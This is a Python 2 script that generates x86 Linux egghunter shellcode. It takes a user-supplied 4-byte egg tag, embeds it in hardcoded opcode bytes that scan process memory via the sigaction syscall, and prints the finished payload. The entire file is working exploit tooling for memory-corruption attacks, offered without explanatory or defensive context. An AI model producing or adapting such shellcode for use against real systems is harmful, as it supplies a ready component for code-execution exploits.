#!/usr/bin/python2

import sys

if len(sys.argv) < 2:
    print "error: insert egg"
    print "Usage: " + sys.argv[0] + " 4 bytes egg, example: " + sys.argv[0] + " w00t"
    exit(1)
if (len(sys.argv[1]) != 4):
    print "error: egg must be of 4 bytes!"
    print "Usage: " + sys.argv[0] + " 4 bytes egg, example: " + sys.argv[0] + " w00t"
    exit(1)
egg = sys.argv[1].strip()
print "EGG: ", egg
egg_hex = ""
for b in bytearray(egg): 
    egg_hex += '\\x'
    egg_hex += '%02x' % b


egghunter = "\\xfc\\xb3\\xff\\x66\\x81\\xc9\\xff\\x0f\\x31\\xd2\\x41\\x31\\xc0\\xb0\\x43\\xcd\\x80\\x3c\\xf2\\x74\\xeb\\xb8" + egg_hex + "\\x89\\xcf\\xaf\\x75\\xeb\\xaf\\x75\\xe8\\xff\\xe7"

print "=" * 10
print "EGGHUNTER:\n"
print egghunter
